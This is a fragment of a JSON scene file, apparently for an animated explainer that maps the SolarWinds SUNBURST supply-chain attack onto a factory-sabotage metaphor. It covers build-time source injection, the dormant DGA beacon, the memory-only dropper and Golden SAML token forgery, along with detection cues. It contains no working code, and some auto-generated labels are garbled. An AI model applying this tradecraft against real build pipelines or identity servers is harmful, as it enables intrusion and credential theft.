      "storyCue": "Imagine a famous armored-truck factory whose blueprints are inspected every evening by careful engineers. Instead of editing the master blueprint on paper where someone would notice, a hidden saboteur watches the factory assembly press and swaps a tiny counterfeit circuit board into the mold for two seconds right as the factory stamps its genuine gold warranty seal onto the finished truck. Eighteen thousand banks buy the sealed truck, where the hidden board sleeps quietly for two weeks before whispering home and unlocking each bank identity vault.",
      "technicalCue": "INITIAL ACCESS: SUNSPOT Build-Time Source Injection into MSBuild -> LATERAL & C2: SUNBURST Dormancy, FNV-1a Blocklist Check & DGA C2 Beacon -> CREDENTIAL ACCESS: TEARDROP Memory-Only Dropper & ADFS Golden SAML Theft",
      "storyMappings": [
        {
          "storyTerm": "Hidden saboteur watching the assembly press",
          "technicalTerm": "SUNSPOT build-hijack service (taskhostsvc.exe) polling MsBuild.exe",
          "tone": "amber"
        },
        {
          "storyTerm": "Swapping a counterfeit board before the gold warranty seal is stamped",
          "technicalTerm": "Transient InventoryManager.cs swap compiled into signed SolarWinds.Orion.Core.BusinessLayer.dll",
          "tone": "sky"
        },
        {
          "storyTerm": "Sleeping for two weeks before whispering home",
          "technicalTerm": "SUNBURST 12-to-14 day dormancy and *.avsvmcloud.com DGA DNS beacon",
          "tone": "rose"
        },
        {
          "storyTerm": "Unlocking each bank identity vault",
          "technicalTerm": "Memory-only TEARDROP loader and ADFS Golden SAML token-signing theft",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-solarwinds-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Hidden saboteur watching the assembly…",
          "subtitle": "SUNSPOT build-hijack service (taskhostsvc.exe) polling…",
          "tone": "amber"
        },
        {
          "id": "sup-solarwinds-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Swapping a counterfeit board before the…",
          "subtitle": "Transient InventoryManager.cs swap compiled into signed…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Belt",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "SUNSPOT Build-Time Source Injection into MSBuild",
          "storyExcerpt": "Standing silently beside the factory stamping press, the saboteur checks the conveyor belt every second. The instant the press lowers to forge a new fleet module, the saboteur slips in a poisoned page…",
          "technicalParallel": "SUNSPOT checks the command-line arguments of MsBuild.exe, verifies target file hashes with MD5, acquires a mutex, replaces InventoryManager.cs, logs any compilation errors to an AES-encrypted log at…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Gold Seal",
          "stageTag": "STAGE 02 · LATERAL & C2",
          "title": "SUNBURST Dormancy, FNV-1a Blocklist Check & DGA C2 Beacon",
          "storyExcerpt": "Delivered inside an official sealed factory shipment, the counterfeit board sits completely silent for two full weeks so test inspectors hear nothing. After confirming it is not sitting inside a security…",
          "technicalParallel": "By encoding the victim’s internal domain name into the DNS DGA query, APT29 could passively inspect DNS lookups at their authoritative nameserver and selectively reply with a CNAME record pointing to a…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Two Home",
          "stageTag": "STAGE 03 · CREDENTIAL ACCESS",
          "title": "TEARDROP Memory-Only Dropper & ADFS Golden SAML Theft",
          "storyExcerpt": "For hand-picked targets, the counterfeit board quietly unfolds a paperless lockpicker straight inside the bank memory, steps into the corporate badge-printing vault, and steals the master embossing plate…",
          "technicalParallel": "Using the stolen ADFS EncryptedPFX blob and Distributed Key Manager (DKM) decryption key from Active Directory, the attacker mints arbitrary SAML 2.0 tokens offline to access Microsoft 365 and Azure…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Assembly Belt",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Gold Seal",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Two-Week Sleep",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "solarwinds-sunburst-orion-supply-chain",
      "sectionKey": "step-1",
      "sceneKind": "sup-solarwinds-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "SUNSPOT Build-Time Source Injection into MSBuild",
      "storyCue": "Standing silently beside the factory stamping press, the saboteur checks the conveyor belt every second. The instant the press lowers to forge a new fleet module, the saboteur slips in a poisoned page, waits for the factory official gold seal to stamp it, and swaps the clean page straight back onto the blueprint table.",
      "technicalCue": "T1195.002 · INITIAL ACCESS — APT29 deployed SUNSPOT (taskhostsvc.exe, a custom build-hijacking service that polls running processes every second for MsBuild.exe) onto the SolarWinds Orion build server.",
      "storyMappings": [
        {
          "storyTerm": "Saboteur checking the conveyor belt every second",
          "technicalTerm": "SUNSPOT (taskhostsvc.exe) polling for MsBuild.exe every 1,000 milliseconds",
          "tone": "amber"
        },
        {
          "storyTerm": "Poisoned page slipped in and swapped back",
          "technicalTerm": "Temporary replacement and restoration of InventoryManager.cs during compilation",
          "tone": "sky"
        },
        {
          "storyTerm": "Official gold seal stamped on the finished module",
          "technicalTerm": "Valid SolarWinds Authenticode code-signing certificate applied to the trojanized DLL",
          "tone": "rose"
        },
        {
          "storyTerm": "Clean blueprint table left untouched",
          "technicalTerm": "Unmodified Git source repository evading developer code review",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-solarwinds-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Saboteur checking the conveyor belt…",
          "subtitle": "SUNSPOT (taskhostsvc.exe) polling for MsBuild.exe every 1,000…",
          "tone": "amber"
        },
        {
          "id": "sup-solarwinds-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Poisoned page slipped in and swapped back",
          "subtitle": "Temporary replacement and restoration of InventoryManager.cs…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Belt",
          "stageTag": "STEP 01 · SETUP",
          "title": "Saboteur checking the conveyor belt every second",
          "storyExcerpt": "Standing silently beside the factory stamping press, the saboteur checks the conveyor belt every second.",
          "technicalParallel": "SUNSPOT checks the command-line arguments of MsBuild.exe, verifies target file hashes with MD5, acquires a mutex, replaces InventoryManager.cs, logs any compilation errors to an AES-encrypted log at…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Page Back",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Poisoned page slipped in and swapped back",
          "storyExcerpt": "The instant the press lowers to forge a new fleet module, the saboteur slips in a poisoned page, waits for the factory official gold seal to stamp it, and swaps the clean page straight back…",
          "technicalParallel": "APT29 deployed SUNSPOT (taskhostsvc.exe, a custom build-hijacking service that polls running processes every second for MsBuild.exe) onto the SolarWinds Orion build server.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Gold Seal",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Clean blueprint table left untouched",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across clean blueprint table left untouched while locking down official gold seal stamped on the finished module.",
          "technicalParallel": "Sysmon EventID 11 file modifications to .cs source files by non-SCM processes (taskhostsvc.exe) during active MsBuild.exe execution, and post-build reproducible compilation verification.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Assembly Belt",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Gold Seal",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Two-Week Sleep",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.002"
    },
    "step-2": {
      "scenarioId": "solarwinds-sunburst-orion-supply-chain",
      "sectionKey": "step-2",
      "sceneKind": "sup-solarwinds-step-2",
      "stageBadge": "STEP #2 · LATERAL & C2",
      "title": "SUNBURST Dormancy, FNV-1a Blocklist Check & DGA C2 Beacon",
      "storyCue": "Delivered inside an official sealed factory shipment, the counterfeit board sits completely silent for two full weeks so test inspectors hear nothing. After confirming it is not sitting inside a security workshop, it sends coded postal inquiries disguised as routine check-ins to ask its remote handler whether this customer is worth robbing.",
      "technicalCue": "T1568.002 · LATERAL & C2 — When customers installed the signed Orion update, SolarWinds.BusinessLayerHost.exe loaded the trojanized DLL.",
      "storyMappings": [
        {
          "storyTerm": "Counterfeit board sitting silent for two weeks",
          "technicalTerm": "SUNBURST 12-to-14 day random dormancy delay inside SolarWinds.BusinessLayerHost.exe",
          "tone": "amber"
        },
        {
          "storyTerm": "Checking it is not inside a security workshop",
          "technicalTerm": "FNV-1a hash blocklist checking for antivirus drivers, debuggers, and analysis domains",
          "tone": "sky"
        },
        {
          "storyTerm": "Coded postal inquiries disguised as routine check-ins",
          "technicalTerm": "Domain Generation Algorithm (DGA) DNS beacons to *.avsvmcloud.com",
          "tone": "rose"
        },
        {
          "storyTerm": "Remote handler signaling whether to rob the bank",
          "technicalTerm": "CNAME DNS response redirecting high-value victims to dedicated C2 infrastructure",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-solarwinds-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Counterfeit board sitting silent for two…",
          "subtitle": "SUNBURST 12-to-14 day random dormancy delay inside…",
          "tone": "amber"
        },
        {
          "id": "sup-solarwinds-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Checking it is not inside a security…",
          "subtitle": "FNV-1a hash blocklist checking for antivirus drivers…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Sits Two",
          "stageTag": "STEP 02 · SETUP",
          "title": "Counterfeit board sitting silent for two weeks",
          "storyExcerpt": "Delivered inside an official sealed factory shipment, the counterfeit board sits completely silent for two full weeks so test inspectors hear nothing.",
          "technicalParallel": "By encoding the victim’s internal domain name into the DNS DGA query, APT29 could passively inspect DNS lookups at their authoritative nameserver and selectively reply with a CNAME record pointing to a…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. It It",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Checking it is not inside a security workshop",
          "storyExcerpt": "After confirming it is not sitting inside a security workshop, it sends coded postal inquiries disguised as routine check-ins to ask its remote handler whether this customer is worth robbing.",
          "technicalParallel": "When customers installed the signed Orion update, SolarWinds.BusinessLayerHost.exe loaded the trojanized DLL.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Rob",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Remote handler signaling whether to rob the bank",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across remote handler signaling whether to rob the bank while locking down coded postal inquiries disguised as routine check-ins.",
          "technicalParallel": "Alert on Sysmon EventID 22 (DNSEvent recording the exact originating process and resolved domain name) showing SolarWinds.BusinessLayerHost.exe querying *.avsvmcloud.com and receiving CNAME redirects to…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Assembly Belt",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Gold Seal",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Two-Week Sleep",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1568.002"
    },
    "step-3": {
      "scenarioId": "solarwinds-sunburst-orion-supply-chain",
      "sectionKey": "step-3",
      "sceneKind": "sup-solarwinds-step-3",
      "stageBadge": "STEP #3 · CREDENTIAL ACCESS",
      "title": "TEARDROP Memory-Only Dropper & ADFS Golden SAML Theft",
      "storyCue": "For hand-picked targets, the counterfeit board quietly unfolds a paperless lockpicker straight inside the bank memory, steps into the corporate badge-printing vault, and steals the master embossing plate so the spies can stamp flawless executive badges for any cloud office whenever they please.",
      "technicalCue": "T1552.004 · CREDENTIAL ACCESS — For selected victims, SUNBURST communicated over HTTPS disguised as SolarWinds Orion Improvement Program (OIP) JSON telemetry, deployed the memory-only TEARDROP dropper via Image File Execution…",
      "storyMappings": [
        {
          "storyTerm": "Paperless lockpicker unfolded inside memory",
          "technicalTerm": "TEARDROP memory-only dropper delivered over disguised OIP JSON HTTPS traffic",
          "tone": "amber"
        },
        {
          "storyTerm": "Corporate badge-printing vault",
          "technicalTerm": "Active Directory Federation Services (ADFS) server and DKM key container",
          "tone": "sky"
        },
        {
          "storyTerm": "Stealing the master embossing plate",
          "technicalTerm": "Extraction of the ADFS token-signing private key certificate",
          "tone": "rose"
        },
        {
          "storyTerm": "Stamping flawless executive badges for cloud offices",
          "technicalTerm": "Golden SAML forgery granting persistent access to Microsoft 365 and federated SaaS",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-solarwinds-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Paperless lockpicker unfolded inside…",
          "subtitle": "TEARDROP memory-only dropper delivered over disguised OIP JSON…",
          "tone": "amber"
        },
        {
          "id": "sup-solarwinds-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Corporate badge-printing vault",
          "subtitle": "Active Directory Federation Services (ADFS) server and DKM key…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Hand-picked Bank",
          "stageTag": "STEP 03 · SETUP",
          "title": "Paperless lockpicker unfolded inside memory",
          "storyExcerpt": "For hand-picked targets, the counterfeit board quietly unfolds a paperless lockpicker straight inside the bank memory, steps into the corporate badge-printing vault, and steals the master…",
          "technicalParallel": "Using the stolen ADFS EncryptedPFX blob and Distributed Key Manager (DKM) decryption key from Active Directory, the attacker mints arbitrary SAML 2.0 tokens offline to access Microsoft 365 and Azure…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Corporate badge-printing vault",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses corporate badge-printing vault to advance toward stealing the master embossing plate.",
          "technicalParallel": "For selected victims, SUNBURST communicated over HTTPS disguised as SolarWinds Orion Improvement Program (OIP) JSON telemetry, deployed the memory-only TEARDROP dropper via Image File Execution Options…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Hand-picked Bank",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Stamping flawless executive badges for cloud offices",
          "storyExcerpt": "Behind the scenes, stamping flawless executive badges for cloud offices captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Correlate EDR alerts on Image File Execution Options (IFEO) Debugger registry keys targeting dllhost.exe (used to hijack trusted binary execution for persistence) with Windows Security logs tracking…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Assembly Belt",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Gold Seal",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Two-Week Sleep",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1552.004"
    }
  }
};
